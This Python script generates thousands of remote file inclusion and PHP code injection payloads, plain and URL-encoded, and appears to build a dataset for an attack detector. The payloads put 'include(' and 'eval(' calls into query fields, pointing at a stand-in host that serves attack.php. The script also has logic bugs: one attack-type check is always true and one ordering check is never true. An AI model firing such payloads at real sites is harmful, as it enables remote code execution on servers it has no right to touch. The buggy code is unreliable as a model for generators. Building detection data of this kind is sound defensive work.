#number of urls - 1 - 9
#number of commands 1 - 9
#whether it has a url and a command or not.
#whether command has contents

#number of sub directories in url - 1-3

from random import randint
import os
from urllib import parse

phpCommands = ["__halt_compiler(",
               "die(",
               "empty(",
               "list(",
               "unset(",
               "eval(",
               "array(",
               "exit(",
               "isset("]

phpIncludes = ["include(",
               "include_once(",
               "require(",
               "require_once("]

fields = ["&username=",
          "&password=",
          "&email=",
          "&id=",
          "&item=",
          "&course=",
          "&pid=",
          "&db=",
          "&response=",
          "&help=",
          "&balance=",
          "&accountID=",
          "&secure=",
          "&last_login=",
          "&page="]

word_file = "/usr/share/dict/words"
WORDS = open(word_file).read().splitlines()

os.chdir(os.getcwd())
outputFile = open("rfiAttacks", "w+")

for i in range(1500): #We will make 3000 attacks total, each one will be encoded as well.
    #first decide type of attack, url 0, command 1, or url and command 2
    attackType = randint(0, 2)

    attack = "/test/website/"
    addedURLs = ""
    addedCMDs = ""

    attackWebsite = "http://www.attackwebsite.com/"
    subDirs = randint(0 ,3)

    for dir in range(subDirs):
        attackWebsite += WORDS[randint(0, len(WORDS)-1)] + "/"

    attackWebsite += "attack.php"

    if attackType is 0 or 2:
        numURLs = randint(1, 9)

        for x in range(numURLs):
            addedURLs += fields[randint(0, len(fields)-1)] + attackWebsite

    if attackType is 1 or 2:
        numCMDs = randint(1, 9)

        for x in range(numCMDs):
            addedCMDs += fields[randint(0, len(fields)-1)] \
                         + "{${" + phpCommands[randint(0, len(phpCommands)-1)]

            hasContent = randint(0, 1)

            if hasContent is 0:
                addedCMDs += WORDS[randint(0, len(WORDS)-1)]

            addedCMDs += ")}}"

    if attackType is 2:
        attack += fields[randint(0, len(fields)-1)] \
                  + "{${" + phpIncludes[randint(0, len(phpIncludes)-1)] \
                  + attackWebsite + ")}}"

    URLsFirst = randint(0, 1)

    if URLsFirst is True:
        attack += addedURLs + addedCMDs
    else:
        attack += addedCMDs + addedURLs

    outputFile.write(attack.replace("&", "?", 1) + "\n")
    outputFile.write(parse.quote(attack.replace("&", "?", 1)) + "\n")